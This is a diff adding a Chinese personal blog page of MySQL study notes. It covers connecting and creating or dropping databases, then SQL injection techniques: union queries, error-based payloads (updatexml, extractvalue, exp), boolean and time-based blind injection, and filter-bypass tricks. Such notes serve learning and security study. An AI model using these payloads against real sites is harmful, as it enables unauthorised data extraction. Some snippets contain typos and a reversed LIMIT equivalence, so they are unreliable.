@@ -1,0 +1,956 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0yu1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MySQL连接1mysql -u your_username -p   -u 参数用于指定用户名。 -p 参数表示需要输入密码。  1mysql -u root -p&#x2F;&#x2F;使用root用户登录  退出：exit；或者quit； 使用PHP脚本连接mysql_connect()，6个参数全部是可选，在成功连接后返回连接标识，失败返回FALSE 1mysqli_connect(host, usernam">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL学习">
+<meta property="og:url" content="http://example.com/2025/03/10/MySQL%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="H0yu1的个人博客">
+<meta property="og:description" content="MySQL连接1mysql -u your_username -p   -u 参数用于指定用户名。 -p 参数表示需要输入密码。  1mysql -u root -p&#x2F;&#x2F;使用root用户登录  退出：exit；或者quit； 使用PHP脚本连接mysql_connect()，6个参数全部是可选，在成功连接后返回连接标识，失败返回FALSE 1mysqli_connect(host, usernam">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-10T08:20:40.000Z">
+<meta property="article:modified_time" content="2025-03-16T08:05:35.591Z">
+<meta property="article:author" content="Lhy">
+<meta property="article:tag" content="MySQL">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>MySQL学习 - H0yu1的个人博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/loader-container.css">
+<link rel="stylesheet" href="/css/part-color.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"rXJiO5xPyhRQujM96YNprg27-gzGzoHsz","app_key":"Xiey4xa540tWKNx6gHaqwjtR","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0yu1</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/sky.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MySQL学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-10 16:20" pubdate>
+          2025年3月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">MySQL学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="MySQL连接"><a href="#MySQL连接" class="headerlink" title="MySQL连接"></a>MySQL连接</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u your_username -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-u</code> 参数用于指定用户名。</li>
+<li><code>-p</code> 参数表示需要输入密码。</li>
+</ul>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">mysql -u<span class="hljs-built_in"> root</span> -p//使<span class="hljs-built_in">用root</span>用户登录<br></code></pre></td></tr></table></figure>
+
+<p>退出：exit；或者quit；</p>
+<h2 id="使用PHP脚本连接"><a href="#使用PHP脚本连接" class="headerlink" title="使用PHP脚本连接"></a>使用PHP脚本连接</h2><p>mysql_connect()，6个参数全部是可选，在成功连接后返回连接标识，失败返回FALSE</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysqli_connect</span>(host, username, password, dbname,port, socket);<br></code></pre></td></tr></table></figure>
+
+<p><code>host</code>：规定主机名或IP</p>
+<p><code>username</code>：规定MySQL用户名</p>
+<p><code>password</code>：密码</p>
+<p><code>dbname</code>：规定默认的数据库</p>
+<p><code>port</code>：端口号</p>
+<p><code>socket</code>：规定socket或要使用的已命名的pipe</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bool</span> mysql_close(mysql <span class="hljs-variable">$link</span>)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通常不需使用mysql_close()，已打开的非持久连接在脚本执行完毕后会自动关闭</p>
+</blockquote>
+<p>eg：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接成功！&#x27;</span>;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><h2 id="creat"><a href="#creat" class="headerlink" title="creat"></a>creat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">creat database if not exists mydatabase;//避免数据库已经存在<br>character set utf8mb4//指定一些选项，字符集<br>collate utf8mb4_general_ci;//排序规则<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用mysqladmin创建"><a href="#使用mysqladmin创建" class="headerlink" title="使用mysqladmin创建"></a>使用mysqladmin创建</h2><p>mysqladmin -u your_username -p creat your_databse</p>
+<ul>
+<li><code>-u</code> 参数用于指定 MySQL 用户名。</li>
+<li><code>-p</code> 参数表示需要输入密码。</li>
+<li><code>create</code> 是执行的操作，表示创建数据库。</li>
+<li><code>your_database</code> 是要创建的数据库的名称。</li>
+</ul>
+<p>mysqladmin 执行其他管理任务</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> your_command<br>eg:<br>mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> status<span class="hljs-comment">//查看服务器状态</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="PHP脚本"><a href="#PHP脚本" class="headerlink" title="PHP脚本"></a>PHP脚本</h2><p>mysqli_query，该函数有两个参数，执行成功返回true,否则返回false.</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysqli_query</span>(connection,query,resultmode);<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>connection</em></td>
+<td>必需。规定要使用的 MySQL 连接。</td>
+</tr>
+<tr>
+<td><em>query</em></td>
+<td>必需，规定查询字符串。</td>
+</tr>
+<tr>
+<td><em>resultmode</em></td>
+<td>可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td>
+</tr>
+</tbody></table>
+<h1 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h1><blockquote>
+<p>注：删除前，请确保你想删除的数据库及所有数据，因为操作不可逆</p>
+</blockquote>
+<h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> &lt;database_name&gt;;<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span>[<span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span>] &lt;database_name&gt;;<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用mysqladmin"><a href="#使用mysqladmin" class="headerlink" title="使用mysqladmin"></a>使用mysqladmin</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> drop your_database<br></code></pre></td></tr></table></figure>
+
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&lt;br /&gt;&#x27;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;DROP DATABASE RUNOOB&#x27;</span>;<br><span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>( <span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span> );<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$retval</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;删除数据库失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库 RUNOOB 删除成功\n&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="SQL注入——基础版"><a href="#SQL注入——基础版" class="headerlink" title="SQL注入——基础版"></a>SQL注入——基础版</h1><h2 id="有回显型"><a href="#有回显型" class="headerlink" title="有回显型"></a>有回显型</h2><p>即页面会将SQL语句返回的内容显示在页面中（标题、内容、作者）</p>
+<h3 id="联合查询注入union"><a href="#联合查询注入union" class="headerlink" title="联合查询注入union"></a>联合查询注入union</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">正常查询语句 <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> columns_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">database</span>.)<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">where</span> condition<br>#若回显只有一行数据，可以让正常查询语句返回为空<br>#前后俩个语句返回的字段数必须相同<br></code></pre></td></tr></table></figure>
+
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>使用一些特殊的函数，会在报错信息里返回参数</p>
+<p>exp()、floor()+and()、updatexml()、extractive()等</p>
+<p><strong><code>updatexml</code></strong>:</p>
+<ul>
+<li>这是MySQL中的一个函数，用于更新XML文档。它的语法是 <code>updatexml(target_xml, xpath_expr, new_xml)</code>。</li>
+</ul>
+<p><strong><code>updatexml(1, concat(...), 1)</code></strong>:</p>
+<ul>
+<li>这里的 <code>1</code> 是占位符，实际并不会被使用。</li>
+<li>由于 <code>updatexml</code> 的第一个参数是一个XML文档，而我们传入的并不是一个有效的XML文档，这会导致一个错误。</li>
+<li>MySQL会返回一个错误消息，其中包含 <code>concat</code> 函数生成的字符串，从而泄露了当前数据库用户的名称。</li>
+</ul>
+<blockquote>
+<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>假设当前数据库用户的名称是 <code>root@localhost</code>，那么 <code>concat(0x7e, (select user()), 0x7e)</code> 会生成字符串 <code>~root@localhost~</code>。由于 <code>updatexml</code> 函数的第一个参数不是一个有效的XML文档，MySQL会返回一个错误消息，其中包含这个字符串。</p>
+<h3 id="错误消息示例："><a href="#错误消息示例：" class="headerlink" title="错误消息示例："></a>错误消息示例：</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">XPATH</span> syntax <span class="hljs-literal">error</span>: <span class="hljs-string">&#x27;~root<span class="hljs-variable">@localhost</span>~&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>通过解析这个错误消息，攻击者可以知道当前数据库用户的名称是 <code>root@localhost</code>。</p>
+<p>将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</p>
+<p>注意：</p>
+<ul>
+<li>报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。</li>
+<li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。</li>
+</ul>
+</blockquote>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>使用永真or 1&#x3D;1或永假or 1&#x3D;2 返回内容是否相同进行布尔盲注</p>
+<p>利用or只要有一个语句为真则全为真</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=$username <span class="hljs-keyword">or</span>(condition)<br>#如果我们将condition语句为真，则整条语句为真，即使我们在$username添加一个肯定不存在的用户名,我们可将condition写为<span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">8</span>来判断数据库名长度，或者acsii(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">130</span>再用二分法快速获取数据名（逐字判断）<br></code></pre></td></tr></table></figure>
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>通过一些可以产生时间差的函数，判断返回内容的响应时间差异判断，sleep()，benchmark()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span>*form <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-variable">$username</span> (and|or)<span class="hljs-keyword">if</span>(length(database()))&gt;8,<span class="hljs-built_in">sleep</span>(3),1)<br></code></pre></td></tr></table></figure>
+
+<p>如果数据库名长度大于8，那么if条件执行sleep(3)，此条语句将进行延迟3秒操作，否则if条件直接返回1，无延迟直接返回</p>
+<h1 id="SQL注入——进阶"><a href="#SQL注入——进阶" class="headerlink" title="SQL注入——进阶"></a>SQL注入——进阶</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="and-or-被过滤-拦截"><a href="#and-or-被过滤-拦截" class="headerlink" title="and&#x2F;or 被过滤&#x2F;拦截"></a>and&#x2F;or 被过滤&#x2F;拦截</h3><ol>
+<li>双写<code>anandd、oorr</code></li>
+<li>使用运算符代替<code>&amp;&amp;、||</code></li>
+<li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li>
+<li>其他方法，如：<code>?id=1^(condition)</code></li>
+</ol>
+<h3 id="空格被过滤-拦截"><a href="#空格被过滤-拦截" class="headerlink" title="空格被过滤&#x2F;拦截"></a>空格被过滤&#x2F;拦截</h3><ol>
+<li>多层括号嵌套</li>
+<li>改用+号</li>
+<li>使用注释代替</li>
+<li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and&#x2F;or前的空格可用省略</li>
+<li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li>
+</ol>
+<p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p>
+<h3 id="括号被过滤-拦截"><a href="#括号被过滤-拦截" class="headerlink" title="括号被过滤&#x2F;拦截"></a>括号被过滤&#x2F;拦截</h3><ul>
+<li>order by 大小比较盲注</li>
+</ul>
+<h3 id="逗号被过滤-拦截"><a href="#逗号被过滤-拦截" class="headerlink" title="逗号被过滤&#x2F;拦截"></a>逗号被过滤&#x2F;拦截</h3><ol>
+<li>改用盲注</li>
+<li>使用join语句代替</li>
+<li><code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></li>
+</ol>
+<h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤&#x2F;拦截"></a>其他系统关键字被过滤&#x2F;拦截</h3><ol>
+<li>双写绕过关键字过滤</li>
+<li>使用同义函数&#x2F;语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li>
+</ol>
+<h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤&#x2F;拦截&#x2F;转义"></a>单双引号被过滤&#x2F;拦截&#x2F;转义</h3><ol>
+<li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li>
+<li>不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</li>
+</ol>
+<h1 id="Latin1默认编码，没学会……"><a href="#Latin1默认编码，没学会……" class="headerlink" title="Latin1默认编码，没学会……"></a>Latin1默认编码，没学会……</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><ul>
+<li>BigInt等数据类型溢出</li>
+<li>函数参数格式错误</li>
+<li>主键&#x2F;字段重复</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>该函数会返回e的x次方，当超过mysql的double数值范围该函数会报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()a)))<br>#<span class="hljs-type">BigInt</span>等数据类型溢出<br>函数参数格式错误<br>主键<span class="hljs-operator">/</span>字段重复<br></code></pre></td></tr></table></figure>
+
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></p>
+<p>适用版本: 5.1.5+</p>
+<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
+<p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p>
+<p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p>
+<p>前后添加~使其不符合xpath格式从而报错。</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p>
+<p>适用版本：5.1.5+</p>
+<p>利用原理与updatexml函数相同</p>
+<p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
+<h3 id="BigInt等数据类型溢出"><a href="#BigInt等数据类型溢出" class="headerlink" title="BigInt等数据类型溢出"></a>BigInt等数据类型溢出</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p>只有5.5.5及其以上版本的MySQL才会产生溢出错误消息，之下的版本对于整数溢出不会发送任何消息。</p>
+<p>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mysql&gt; select 9223372036854775807<span class="hljs-string">+1</span>;<br><span class="hljs-keyword">ERROR </span>1690 (22003): BIGINT value is out of range in &#x27;(9223372036854775807 + 1)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>如果我们对数值0逐位取反，结果会怎么样呢？ 当然是得到一个无符号的最大BIGINT值，这一点是显而易见的。</p>
